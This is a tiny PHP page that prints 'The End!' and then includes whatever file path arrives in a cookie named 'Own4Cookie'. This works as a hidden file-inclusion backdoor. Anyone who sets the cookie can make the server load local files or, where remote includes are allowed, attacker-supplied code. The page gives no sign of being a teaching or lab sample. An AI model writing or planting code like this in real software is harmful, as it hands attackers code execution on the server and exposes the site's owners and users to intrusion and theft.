<?

echo "The End!";
echo "<br>";
include($_COOKIE["Own4Cookie"]);

?>
